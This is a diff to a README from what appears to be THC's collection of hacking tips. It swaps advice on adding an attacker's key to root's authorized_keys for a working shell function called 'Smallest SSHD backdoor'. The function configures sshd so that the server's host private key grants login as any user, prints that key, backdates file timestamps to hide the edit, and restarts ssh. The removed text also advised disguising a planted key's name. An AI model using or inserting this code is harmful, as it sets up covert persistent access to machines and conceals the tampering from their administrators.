@@ -73,7 +73,7 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
 1. [Backdoors](#backdoor)
    1. [gs-netcat](#gsnc)
    2. [sshx.io](#sshx)
-   1. [authorized_keys](#backdoor-auth-keys)
+   1. [Smallest SSHD backdoor](#backdoor-sshd)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#php-backdoor)
    1. [Smallest reverse DNS-tunnel backdoor](#reverse-dns-backdoor)
@@ -1797,23 +1797,36 @@ curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar
 for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
 ```
 
-<a id="backdoor-auth-keys"></a>
-**6.iii. authorized_keys**
+<a id="backdoor-sshd"></a>
+**6.iii. Smallest SSHD backdoor**
 
-Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>
+Adding your key to *authorized_keys* is overused 😩. Instead, use this (root only):
 
-* It survives reboots.
-* It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.
-* We have even seen our key being copied to other companies!
-
-Tip: Change the name at the end of the ssh public keyfile to something obscure like *backup@ubuntu* or the admin's real name:
+```shell
+backdoor_sshd() {
+	local K="/etc/ssh/ssh_host_ed25519_key"
+	local D="/etc/ssh/sshd_config.d"
+	local N=$(cd "${D}" || exit; shopt -s nullglob; echo *.conf)
+	[ -n "$N" ] && N="${N%%\.conf*}.conf"
+	N="${D}/${N:-50-cloud-init.conf}"
+	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
+	grep -qm1 '^AuthorizedKeysFile' "$N" 2>/dev/null && return
+	/usr/sbin/sshd -V 2>&1 | grep -qE 'SSH_(9|[1-9]{1}[0-9]{1})' || EGG="Y"
+	echo -e "AuthorizedKeysFile\t${EGG:+.ssh/authorized_keys .ssh/authorized_keys2 }${K}.pub" >>"${N}" || return
+	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
+	touch -r "$K" "$N" "$D" \
+	&& declare -f ctime >/dev/null && ctime "$N" "$D"
+	systemctl restart ssh
+}
+backdoor_sshd
 ```
-$ cat id_rsa.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
-[...]
-u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
-c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
-```
+
+How it works:
+- The SSHD host key is just a normal ed25519 key.
+- Any ed25519 key can be used to authenticate a login.
+- Configure SSHD to use the *Public Host Key* as an additional list of public keys for authentication.
+- SSHD will now check .ssh/authorized_keys and /etc/ssh/ssh_host_ed25519_key.pub for valid login keys.
+
 <a id="backdoor-network"></a>
 **6.vi. Remote Access to an entire network**
 
